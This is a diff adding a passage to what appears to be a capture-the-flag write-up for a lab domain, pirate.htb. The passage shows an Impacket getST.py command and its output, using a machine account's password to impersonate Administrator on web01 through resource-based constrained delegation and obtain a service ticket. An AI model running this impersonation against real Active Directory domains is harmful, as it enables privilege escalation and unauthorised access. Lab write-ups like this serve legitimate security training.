@@ -537,6 +537,21 @@ The attack was completed
 
 I can now use the added machine account to impersonate any user on `web01$` using RBCD
 
+```python
+faketime -f +7h getST.py -spn 'cifs/web01.pirate.htb' -impersonate Administrator pirate.htb/'GFSNAPOT$':'dmhA4CZ0Az7aVno'
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] Requesting S4U2self
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_web01.pirate.htb@PIRATE.HTB.ccache
+```
+
+I now have a ticket for the `web01$` administrator
+
+# Administrator on `web01`
 
 
 
